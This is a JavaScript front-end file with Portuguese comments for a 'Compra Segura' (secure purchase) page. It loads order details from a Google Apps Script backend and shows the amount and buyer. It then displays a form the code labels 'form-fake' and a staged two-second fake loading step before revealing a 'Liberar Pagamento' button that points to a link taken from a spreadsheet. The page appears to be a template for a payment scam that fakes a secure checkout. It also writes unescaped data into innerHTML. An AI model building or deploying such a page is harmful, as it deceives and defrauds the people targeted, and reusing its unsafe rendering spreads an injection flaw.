// ========================================================
// ⚙️ CONFIGURAÇÃO: ATUALIZE COM A URL DO DEPLOY
const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
// ========================================================

const mainContainer = document.getElementById('main-container');

// Inicialização
(async function init() {
  const params = new URLSearchParams(window.location.search);
  const id = params.get('id');

  if (!id) {
    return renderError('Link incompleto.');
  }

  try {
    // O Backend original exige ?action=get&id=...
    const response = await fetch(`${WEB_APP_URL}?action=get&id=${id}`);
    const json = await response.json();

    if (json.status === 'success') {
      renderContainer(json.data);
    } else {
      renderError(json.message || 'Pedido não encontrado.');
    }
  } catch (err) {
    console.error(err);
    renderError('Erro de conexão.');
  }
})();

function renderContainer(dadosBrutos) {
  // Normaliza chaves
  const dados = {};
  Object.keys(dadosBrutos).forEach(key => dados[key.toLowerCase()] = dadosBrutos[key]);

  // Aliases para garantir que funcione com nomes variados na planilha
  const valor = dados.valor || dados['valor total'] || '';
  const linkCheckout = dados.linkpagamento || dados.link || '#';

  mainContainer.innerHTML = '';
  
  // Renderiza HTML (Simplificado conforme seu original)
  const content = document.createElement('div');
  content.className = 'container';
  content.innerHTML = `
    <div class="header-title">Compra Segura</div>
    <div class="content">
      <p>Valor: <strong>${valor}</strong></p>
      <p>Comprador: ${dados.comprador || '---'}</p>
      
      <div id="loader-area" style="display:none; text-align:center; margin-top:20px;">
         <p>Processando...</p>
      </div>

      <form id="form-fake">
        <input type="text" placeholder="Nome" required>
        <button type="submit">Continuar</button>
      </form>

      <a id="btn-final" href="${linkCheckout}" class="hidden" style="display:none; background:green; color:white; padding:10px; display:block; text-align:center; margin-top:10px; text-decoration:none;">
        Liberar Pagamento
      </a>
    </div>
  `;
  
  mainContainer.appendChild(content);

  // Lógica simples de simulação (Fake Loading)
  const form = content.querySelector('#form-fake');
  const loader = content.querySelector('#loader-area');
  const btnFinal = content.querySelector('#btn-final');

  form.addEventListener('submit', (e) => {
    e.preventDefault();
    form.style.display = 'none';
    loader.style.display = 'block';
    
    // Simula 2 segundos e mostra o botão com o link da planilha
    setTimeout(() => {
        loader.style.display = 'none';
        btnFinal.style.display = 'block';
        btnFinal.classList.remove('hidden');
    }, 2000);
  });
}

function renderError(msg) {
  mainContainer.innerHTML = `<div style="padding:20px; text-align:center; color:red;">${msg}</div>`;
}
